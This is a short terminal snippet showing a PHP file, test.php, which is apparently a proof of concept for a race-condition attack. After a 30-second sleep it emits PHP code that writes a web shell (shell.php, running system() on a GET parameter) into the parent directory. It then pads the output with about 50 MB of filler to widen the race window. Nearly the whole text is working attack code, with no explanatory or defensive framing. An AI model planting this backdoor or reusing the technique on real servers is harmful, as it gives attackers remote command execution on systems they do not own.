cat test.php 
<?php 
//system("id"); 
set_time_limit(0);
sleep(30);
echo '<?php file_put_contents("../shell.php","<?php system(\$_GET[c]) ;");';


echo '?>' . str_repeat("A",50000000);// 60MB file bigger  for race condition
//sleep(58);

flush();
ob_flush();

?>

=============================================

